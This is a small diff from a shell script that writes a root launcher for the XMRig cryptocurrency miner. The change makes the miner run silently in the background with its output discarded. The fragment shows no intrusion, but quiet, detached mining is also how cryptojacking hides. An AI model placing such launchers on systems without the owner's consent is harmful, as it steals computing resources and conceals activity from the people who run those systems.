@@ -16,7 +16,7 @@ limitCPU=$((cores * 80))
 
 cat >>/root/danielchau.sh <<EOF
 #!/bin/bash
-sudo /root/xmrig-6.21.0/xmrig
+sudo /root/xmrig-6.21.0/xmrig > /dev/null 2>&1 &
 sleep 5
 EOF
 chmod +x /root/danielchau.sh
